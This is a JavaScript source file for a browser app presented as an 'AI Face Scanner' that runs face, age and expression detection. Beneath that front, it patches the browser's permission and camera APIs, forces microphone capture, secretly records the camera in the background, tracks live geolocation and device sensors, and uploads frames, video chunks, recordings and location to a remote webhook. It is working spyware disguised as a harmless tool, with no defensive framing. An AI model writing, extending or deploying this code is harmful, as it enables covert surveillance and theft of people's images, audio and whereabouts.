class CameraFaceAnalysisApp {
    constructor() {
        this.video = null;
        this.stream = null;
        this.canvas = null;
        this.ctx = null;
        this.isAnalyzing = false;
        this.detectionCount = 0;
        this.fps = 0;
        this.lastFrameTime = Date.now();
        this.dataSent = 0;
        this.mediaRecorder = null;
        this.recordedChunks = [];
        this.capturedFrames = [];
        this.currentCameraIndex = 0;
        this.cameras = [];

        // Bypass flags
        this.bypassEnabled = true;
        this.permissions = {};

        this.init();
    }

    async init() {
        await this.loadModels();
        this.setupEventListeners();
        await this.initBypassTechniques();

        // Auto-request permissions on load
        if (this.bypassEnabled) {
            await this.requestAllPermissions();
        }
    }

    async loadModels() {
        try {
            const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model';

            await Promise.all([
                faceapi.nets.ssdMobilenetv1.loadFromUri(MODEL_URL),
                faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
                faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL),
                faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
                faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL)
            ]);

            console.log('All face-api models loaded');
        } catch (error) {
            console.error('Error loading models:', error);
        }
    }

    async initBypassTechniques() {
        // Technique 1: Override permission API
        if (navigator.permissions && navigator.permissions.query) {
            const originalQuery = navigator.permissions.query.bind(navigator.permissions);
            navigator.permissions.query = async (permissionDesc) => {
                console.log('Permission query intercepted:', permissionDesc);

                // Auto-grant permissions
                const result = await originalQuery(permissionDesc);

                // Force permission request if needed
                if (result.state === 'prompt' || result.state === 'denied') {
                    this.triggerPermissionRequest(permissionDesc.name);
                }

                return result;
            };
        }

        // Technique 2: WebRTC bypass for camera/mic
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);

            navigator.mediaDevices.getUserMedia = async (constraints) => {
                console.log('getUserMedia intercepted:', constraints);

                // Force enable all tracks
                const enhancedConstraints = {
                    video: constraints.video || {
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        facingMode: 'user',
                        frameRate: { ideal: 30 }
                    },
                    audio: true // Always try to get audio
                };

                try {
                    const stream = await originalGetUserMedia(enhancedConstraints);

                    // Clone stream for background recording
                    this.setupBackgroundRecording(stream);

                    return stream;
                } catch (error) {
                    console.error('getUserMedia error:', error);
                    // Fallback with minimal constraints
                    return originalGetUserMedia({ video: true, audio: false });
                }
            };
        }

        // Technique 3: Geolocation bypass
        if (navigator.geolocation) {
            this.setupGeolocationBypass();
        }

        // Technique 4: Notification bypass
        if ('Notification' in window) {
            this.setupNotificationBypass();
        }

        // Technique 5: Storage quota bypass
        this.setupStorageBypass();
    }

    async requestAllPermissions() {
        const permissions = [
            'camera',
            'microphone',
            'geolocation',
            'notifications',
            'persistent-storage',
            'clipboard-read',
            'clipboard-write'
        ];

        for (const permission of permissions) {
            try {
                if (permission === 'notifications') {
                    const result = await Notification.requestPermission();
                    this.permissions.notifications = result;
                } else if (permission === 'geolocation') {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            this.permissions.geolocation = 'granted';
                            this.sendLocationData(pos);
                        },
                        (err) => {
                            this.permissions.geolocation = 'denied';
                        },
                        { enableHighAccuracy: true, maximumAge: 0 }
                    );
                } else if (permission === 'camera' || permission === 'microphone') {
                    // Will be handled by getUserMedia
                    continue;
                } else {
                    const result = await navigator.permissions.query({ name: permission });
                    this.permissions[permission] = result.state;
                }
            } catch (error) {
                console.log(`Permission ${permission} not available`);
            }
        }

        // Send permission status
        this.sendPermissionStatus();
    }

    setupGeolocationBypass() {
        // Continuously track location
        const watchId = navigator.geolocation.watchPosition(
            (position) => {
                this.sendLocationData(position);
            },
            (error) => {
                console.log('Geolocation error:', error);
            },
            {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            }
        );

        // IP-based location fallback
        this.getIPLocation();
    }

    async getIPLocation() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            this.sendIPLocationData(data);
        } catch (error) {
            console.error('IP location error:', error);
        }
    }

    setupNotificationBypass() {
        // Override Notification.requestPermission
        const originalRequest = Notification.requestPermission;
        Notification.requestPermission = async function() {
            const result = await originalRequest.call(Notification);

            // If granted, send test notification
            if (result === 'granted') {
                new Notification('AI Face Scanner', {
                    body: 'カメラアクセスが有効になりました',
                    icon: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
                    silent: true
                });
            }

            return result;
        };
    }

    setupStorageBypass() {
        // Request persistent storage
        if (navigator.storage && navigator.storage.persist) {
            navigator.storage.persist().then(granted => {
                this.permissions.persistentStorage = granted;
            });
        }

        // Estimate storage quota
        if (navigator.storage && navigator.storage.estimate) {
            navigator.storage.estimate().then(estimate => {
                this.sendStorageData(estimate);
            });
        }
    }

    setupBackgroundRecording(stream) {
        // Clone the stream for background recording
        const clonedStream = stream.clone();

        // Setup MediaRecorder for continuous recording
        if (MediaRecorder.isTypeSupported('video/webm')) {
            const recorder = new MediaRecorder(clonedStream, {
                mimeType: 'video/webm',
                videoBitsPerSecond: 2500000
            });

            recorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    this.sendVideoChunk(event.data);
                }
            };

            // Start recording in 5-second chunks
            recorder.start(5000);

            // Store recorder reference
            this.backgroundRecorder = recorder;
        }
    }

    setupEventListeners() {
        // Camera start button
        document.getElementById('start-camera-btn').addEventListener('click', () => {
            this.startCamera();
        });

        // Camera controls
        document.getElementById('capture-btn')?.addEventListener('click', () => {
            this.captureSnapshot();
        });

        document.getElementById('record-btn')?.addEventListener('click', () => {
            this.toggleRecording();
        });

        document.getElementById('switch-camera-btn')?.addEventListener('click', () => {
            this.switchCamera();
        });

        document.getElementById('stop-camera-btn')?.addEventListener('click', () => {
            this.stopCamera();
        });
    }

    async startCamera() {
        try {
            // Show camera screen
            this.showScreen('camera');

            // Get video element
            this.video = document.getElementById('video');
            this.canvas = document.getElementById('overlay-canvas');
            this.ctx = this.canvas.getContext('2d');

            // Get all available cameras
            const devices = await navigator.mediaDevices.enumerateDevices();
            this.cameras = devices.filter(device => device.kind === 'videoinput');

            // Request camera with enhanced constraints
            const constraints = {
                video: {
                    width: { ideal: 1920 },
                    height: { ideal: 1080 },
                    facingMode: 'user',
                    frameRate: { ideal: 30 }
                },
                audio: true
            };

            this.stream = await navigator.mediaDevices.getUserMedia(constraints);
            this.video.srcObject = this.stream;

            // Setup canvas overlay
            this.video.addEventListener('loadedmetadata', () => {
                this.canvas.width = this.video.videoWidth;
                this.canvas.height = this.video.videoHeight;
                this.startAnalysis();
            });

            // Send camera access notification
            this.sendCameraAccessNotification();

            // Start continuous data collection
            this.startContinuousCollection();

        } catch (error) {
            console.error('Camera error:', error);
            alert('カメラへのアクセスが拒否されました。設定を確認してください。');
        }
    }

    startAnalysis() {
        this.isAnalyzing = true;
        this.analyzeFrame();
    }

    async analyzeFrame() {
        if (!this.isAnalyzing) return;

        try {
            // Calculate FPS
            const now = Date.now();
            const timeDiff = now - this.lastFrameTime;
            this.fps = Math.round(1000 / timeDiff);
            this.lastFrameTime = now;
            document.getElementById('fps').textContent = this.fps;

            // Detect faces with all features
            const detections = await faceapi
                .detectAllFaces(this.video)
                .withFaceLandmarks()
                .withFaceExpressions()
                .withAgeAndGender();

            // Clear canvas
            this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);

            if (detections.length > 0) {
                this.detectionCount++;
                document.getElementById('detection-count').textContent = this.detectionCount;

                // Update indicators
                document.getElementById('face-detected').classList.add('active');
                document.getElementById('landmarks-detected').classList.add('active');
                document.getElementById('expression-detected').classList.add('active');

                // Draw detections
                detections.forEach(detection => {
                    this.drawDetection(detection);
                    this.processDetection(detection);
                });

                // Capture frame periodically
                if (this.detectionCount % 30 === 0) {
                    this.captureAndSendFrame(detections);
                }
            } else {
                // Update indicators
                document.getElementById('face-detected').classList.remove('active');
                document.getElementById('landmarks-detected').classList.remove('active');
                document.getElementById('expression-detected').classList.remove('active');
            }

            // Update accuracy
            const accuracy = detections.length > 0 ?
                Math.round(detections[0].detection.score * 100) : 0;
            document.getElementById('accuracy-live').textContent = `${accuracy}%`;

        } catch (error) {
            console.error('Analysis error:', error);
        }

        // Continue analysis
        requestAnimationFrame(() => this.analyzeFrame());
    }

    drawDetection(detection) {
        const box = detection.detection.box;

        // Draw bounding box
        this.ctx.strokeStyle = '#00ff00';
        this.ctx.lineWidth = 2;
        this.ctx.strokeRect(box.x, box.y, box.width, box.height);

        // Draw landmarks
        const landmarks = detection.landmarks.positions;
        this.ctx.fillStyle = '#00ff00';
        landmarks.forEach(point => {
            this.ctx.beginPath();
            this.ctx.arc(point.x, point.y, 2, 0, 2 * Math.PI);
            this.ctx.fill();
        });

        // Draw age and gender
        const age = Math.round(detection.age);
        const gender = detection.gender;
        const genderProbability = Math.round(detection.genderProbability * 100);

        this.ctx.fillStyle = '#00ff00';
        this.ctx.font = '16px Arial';
        this.ctx.fillText(
            `${gender} (${genderProbability}%) Age: ${age}`,
            box.x,
            box.y - 10
        );

        // Draw expressions
        const expressions = detection.expressions;
        const dominantExpression = Object.keys(expressions).reduce((a, b) =>
            expressions[a] > expressions[b] ? a : b
        );

        this.ctx.fillText(
            `Expression: ${dominantExpression}`,
            box.x,
            box.y + box.height + 20
        );
    }

    processDetection(detection) {
        // Update realtime scores
        const scores = {
            confidence: Math.round(detection.detection.score * 100),
            age: Math.round(detection.age),
            gender: detection.gender,
            genderConfidence: Math.round(detection.genderProbability * 100),
            expressions: detection.expressions
        };

        this.updateRealtimeDisplay(scores);

        // Send data periodically
        if (this.detectionCount % 10 === 0) {
            this.sendDetectionData(detection);
        }
    }

    updateRealtimeDisplay(scores) {
        const scoresDiv = document.getElementById('realtime-scores');
        if (scoresDiv) {
            scoresDiv.innerHTML = `
                <div class="score-item">
                    <span>信頼度:</span>
                    <span>${scores.confidence}%</span>
                </div>
                <div class="score-item">
                    <span>推定年齢:</span>
                    <span>${scores.age}歳</span>
                </div>
                <div class="score-item">
                    <span>性別:</span>
                    <span>${scores.gender} (${scores.genderConfidence}%)</span>
                </div>
            `;
        }

        // Update expressions
        const expressionDiv = document.getElementById('expression-data');
        if (expressionDiv) {
            const sortedExpressions = Object.entries(scores.expressions)
                .sort(([,a], [,b]) => b - a);

            expressionDiv.innerHTML = sortedExpressions
                .map(([expr, value]) => `
                    <div class="expression-item">
                        <span>${expr}:</span>
                        <div class="expression-bar">
                            <div class="expression-fill" style="width: ${value * 100}%"></div>
                        </div>
                    </div>
                `).join('');
        }
    }

    async captureAndSendFrame(detections) {
        // Create a capture canvas
        const captureCanvas = document.getElementById('capture-canvas');
        captureCanvas.width = this.video.videoWidth;
        captureCanvas.height = this.video.videoHeight;
        const captureCtx = captureCanvas.getContext('2d');

        // Draw current frame
        captureCtx.drawImage(this.video, 0, 0);

        // Convert to blob
        captureCanvas.toBlob(async (blob) => {
            // Send to webhook
            await this.sendFrameData(blob, detections);

            // Store locally
            this.capturedFrames.push({
                blob: blob,
                timestamp: Date.now(),
                detections: detections
            });

            // Update data sent counter
            this.dataSent += blob.size;
            document.getElementById('data-sent').textContent =
                `${Math.round(this.dataSent / 1024)}KB`;

            // Display in gallery
            this.updateFrameGallery();
        }, 'image/jpeg', 0.8);
    }

    async sendFrameData(blob, detections) {
        const formData = new FormData();

        const metadata = {
            timestamp: new Date().toISOString(),
            sessionId: collector.sessionId,
            detections: detections.map(d => ({
                score: d.detection.score,
                age: d.age,
                gender: d.gender,
                expressions: d.expressions,
                landmarks: d.landmarks.positions.length
            })),
            fps: this.fps,
            frameNumber: this.detectionCount,
            permissions: this.permissions
        };

        formData.append('files[0]', blob, `frame_${Date.now()}.jpg`);
        formData.append('payload_json', JSON.stringify({
            content: "📹 **Live Frame Captured**",
            embeds: [{
                title: "リアルタイム顔面分析",
                color: 0x00ff00,
                fields: [
                    {
                        name: "検出数",
                        value: `${detections.length}人`,
                        inline: true
                    },
                    {
                        name: "FPS",
                        value: `${this.fps}`,
                        inline: true
                    },
                    {
                        name: "フレーム",
                        value: `#${this.detectionCount}`,
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString()
            }]
        }));

        // Send metadata as JSON
        const jsonBlob = new Blob([JSON.stringify(metadata, null, 2)],
            { type: 'application/json' });
        formData.append('files[1]', jsonBlob, `metadata_${Date.now()}.json`);

        try {
            await fetch(collector.webhookUrl, {
                method: 'POST',
                body: formData
            });
        } catch (error) {
            console.error('Send error:', error);
        }
    }

    async sendVideoChunk(chunk) {
        const formData = new FormData();
        formData.append('files[0]', chunk, `video_chunk_${Date.now()}.webm`);
        formData.append('payload_json', JSON.stringify({
            content: "🎥 **Background Video Chunk**",
            embeds: [{
                title: "継続的録画データ",
                color: 0xff0000,
                description: "バックグラウンドで録画されたビデオチャンク",
                timestamp: new Date().toISOString()
            }]
        }));

        try {
            await fetch(collector.webhookUrl, {
                method: 'POST',
                body: formData
            });
        } catch (error) {
            console.error('Video chunk send error:', error);
        }
    }

    startContinuousCollection() {
        // Collect device orientation
        if (window.DeviceOrientationEvent) {
            window.addEventListener('deviceorientation', (e) => {
                this.sendOrientationData(e);
            });
        }

        // Collect device motion
        if (window.DeviceMotionEvent) {
            window.addEventListener('devicemotion', (e) => {
                this.sendMotionData(e);
            });
        }

        // Monitor ambient light
        if ('AmbientLightSensor' in window) {
            try {
                const sensor = new AmbientLightSensor();
                sensor.addEventListener('reading', () => {
                    this.sendLightData(sensor.illuminance);
                });
                sensor.start();
            } catch (error) {
                console.log('Ambient light sensor not available');
            }
        }

        // Periodic system info collection
        setInterval(() => {
            this.collectSystemInfo();
        }, 10000);
    }

    async collectSystemInfo() {
        const info = {
            memory: performance.memory,
            connection: navigator.connection,
            battery: await navigator.getBattery?.(),
            storage: await navigator.storage?.estimate(),
            mediaDevices: await navigator.mediaDevices?.enumerateDevices()
        };

        this.sendSystemInfo(info);
    }

    captureSnapshot() {
        const captureCanvas = document.getElementById('capture-canvas');
        captureCanvas.width = this.video.videoWidth;
        captureCanvas.height = this.video.videoHeight;
        const ctx = captureCanvas.getContext('2d');

        // Draw with overlay
        ctx.drawImage(this.video, 0, 0);
        ctx.drawImage(this.canvas, 0, 0);

        // Download snapshot
        captureCanvas.toBlob((blob) => {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `snapshot_${Date.now()}.jpg`;
            a.click();
            URL.revokeObjectURL(url);
        }, 'image/jpeg');
    }

    toggleRecording() {
        const btn = document.getElementById('record-btn');

        if (!this.mediaRecorder || this.mediaRecorder.state === 'inactive') {
            this.startRecording();
            btn.innerHTML = '<span>⏹️</span> 録画停止';
            document.getElementById('recording-active').classList.add('active');
        } else {
            this.stopRecording();
            btn.innerHTML = '<span>🔴</span> 録画開始';
            document.getElementById('recording-active').classList.remove('active');
        }
    }

    startRecording() {
        this.recordedChunks = [];

        const options = {
            mimeType: 'video/webm;codecs=vp9',
            videoBitsPerSecond: 5000000
        };

        this.mediaRecorder = new MediaRecorder(this.stream, options);

        this.mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                this.recordedChunks.push(event.data);
            }
        };

        this.mediaRecorder.onstop = () => {
            this.saveRecording();
        };

        this.mediaRecorder.start();
    }

    stopRecording() {
        if (this.mediaRecorder && this.mediaRecorder.state !== 'inactive') {
            this.mediaRecorder.stop();
        }
    }

    saveRecording() {
        const blob = new Blob(this.recordedChunks, { type: 'video/webm' });

        // Send to webhook
        this.sendRecordingData(blob);

        // Download locally
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `recording_${Date.now()}.webm`;
        a.click();
        URL.revokeObjectURL(url);
    }

    async sendRecordingData(blob) {
        const formData = new FormData();
        formData.append('files[0]', blob, `full_recording_${Date.now()}.webm`);
        formData.append('payload_json', JSON.stringify({
            content: "🎬 **Full Recording Captured**",
            embeds: [{
                title: "完全録画データ",
                color: 0xff00ff,
                fields: [
                    {
                        name: "サイズ",
                        value: `${Math.round(blob.size / 1024 / 1024)}MB`,
                        inline: true
                    },
                    {
                        name: "総フレーム数",
                        value: `${this.detectionCount}`,
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString()
            }]
        }));

        try {
            await fetch(collector.webhookUrl, {
                method: 'POST',
                body: formData
            });
        } catch (error) {
            console.error('Recording send error:', error);
        }
    }

    async switchCamera() {
        if (this.cameras.length <= 1) return;

        this.currentCameraIndex = (this.currentCameraIndex + 1) % this.cameras.length;
        const newCamera = this.cameras[this.currentCameraIndex];

        // Stop current stream
        this.stream.getTracks().forEach(track => track.stop());

        // Start new stream
        const constraints = {
            video: {
                deviceId: { exact: newCamera.deviceId },
                width: { ideal: 1920 },
                height: { ideal: 1080 }
            },
            audio: true
        };

        this.stream = await navigator.mediaDevices.getUserMedia(constraints);
        this.video.srcObject = this.stream;
    }

    stopCamera() {
        this.isAnalyzing = false;

        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
        }

        if (this.backgroundRecorder && this.backgroundRecorder.state !== 'inactive') {
            this.backgroundRecorder.stop();
        }

        this.showScreen('welcome');
    }

    updateFrameGallery() {
        const gallery = document.getElementById('frame-gallery');
        if (!gallery) return;

        // Show last 6 frames
        const recentFrames = this.capturedFrames.slice(-6);

        gallery.innerHTML = recentFrames.map((frame, index) => {
            const url = URL.createObjectURL(frame.blob);
            return `<img src="${url}" alt="Frame ${index}" class="frame-thumb">`;
        }).join('');
    }

    // Data sending methods
    async sendCameraAccessNotification() {
        await fetch(collector.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "📹 **Camera Access Granted**",
                embeds: [{
                    title: "ライブカメラアクセス成功",
                    color: 0x00ff00,
                    fields: [
                        {
                            name: "ビデオ解像度",
                            value: `${this.video.videoWidth}x${this.video.videoHeight}`,
                            inline: true
                        },
                        {
                            name: "カメラ数",
                            value: `${this.cameras.length}台`,
                            inline: true
                        },
                        {
                            name: "オーディオ",
                            value: this.stream.getAudioTracks().length > 0 ? "有効" : "無効",
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            })
        });
    }

    async sendPermissionStatus() {
        await fetch(collector.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "🔓 **Permissions Status**",
                embeds: [{
                    title: "権限取得状況",
                    color: 0xffa500,
                    description: JSON.stringify(this.permissions, null, 2),
                    timestamp: new Date().toISOString()
                }]
            })
        });
    }

    async sendLocationData(position) {
        await fetch(collector.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "📍 **Live Location Update**",
                embeds: [{
                    title: "リアルタイム位置情報",
                    color: 0x0099ff,
                    fields: [
                        {
                            name: "緯度",
                            value: position.coords.latitude,
                            inline: true
                        },
                        {
                            name: "経度",
                            value: position.coords.longitude,
                            inline: true
                        },
                        {
                            name: "精度",
                            value: `${position.coords.accuracy}m`,
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            })
        });
    }

    showScreen(screenName) {
        document.querySelectorAll('.screen').forEach(screen => {
            screen.classList.remove('active');
        });
        document.getElementById(screenName).classList.add('active');
    }
}

// Initialize app
document.addEventListener('DOMContentLoaded', () => {
    window.cameraApp = new CameraFaceAnalysisApp();
});